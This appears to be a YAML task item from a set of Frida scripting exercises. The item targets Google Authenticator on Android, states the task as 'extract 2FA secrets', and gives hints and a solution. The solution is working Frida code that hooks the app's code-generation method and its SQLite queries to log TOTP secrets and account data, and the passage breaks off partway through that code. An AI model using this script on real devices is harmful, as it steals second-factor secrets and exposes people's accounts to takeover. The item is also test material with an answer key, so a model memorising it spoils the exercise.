  difficulty: 5
  script_type: frida
  compatibility: universal
  persona_requirements:
    required_apps:
    - com.google.android.apps.authenticator2
  inputs:
    target_package: com.google.android.apps.authenticator2
    device_context:
      task: extract 2FA secrets
      target_app: Google Authenticator
  validation:
    type: regex_match
    pattern: (TOTP|secret|generateCode|OTP)
  hints:
  - TOTP secrets are Base32-encoded strings
  - Look for database operations storing account info
  - The code generation method takes the secret as input
  - SQLite database may contain the secrets
  kata_solution: "Java.perform(function() {\n    // Hook TOTP generation\n    try {\n        var OtpProvider = Java.use(\"\
    com.google.android.apps.authenticator2.otp.OtpProvider\");\n        OtpProvider.getNextCode.implementation = function(secret)\
    \ {\n            console.log(\"[TOTP SECRET] \" + secret);\n            return this.getNextCode(secret);\n        };\n\
    \    } catch(e) {}\n\n    // Hook database queries for stored secrets\n    var SQLiteDatabase = Java.use(\"android.database.sqlite.SQLiteDatabase\"\
    );\n    SQLiteDatabase.rawQuery.implementation = function(sql, args) {\n        console.log(\"[SQL] \" + sql);\n     \
    \   if (sql.toLowerCase().includes(\"accounts\") ||\n            sql.toLowerCase().includes(\"secret\")) {\n         \
